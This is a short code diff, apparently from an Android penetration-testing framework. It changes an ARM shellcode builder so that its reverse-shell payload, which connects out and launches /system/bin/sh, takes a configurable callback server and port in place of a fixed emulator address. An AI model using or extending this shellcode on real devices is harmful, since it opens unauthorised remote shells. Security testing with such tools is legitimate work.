@@ -29,8 +29,8 @@ class ARMEABI(Module, common.ShellCode):
                      0x69, 0x46, 0x0b, 0x27,
                      0x01, 0xdf, 0xc0, 0x46,
                      0x02, 0x00])
-        self.append(self.hexifyInt32(31415))
-        self.append(self.hexifyInetAddr("10.0.2.2"))
+        self.append(self.hexifyInt32(int(arguments.server[1])))
+        self.append(self.hexifyInetAddr(arguments.server[0]))
         self.append(self.hexifyString("/system/bin/sh"))
         self.append(self.hexifyNull())
         
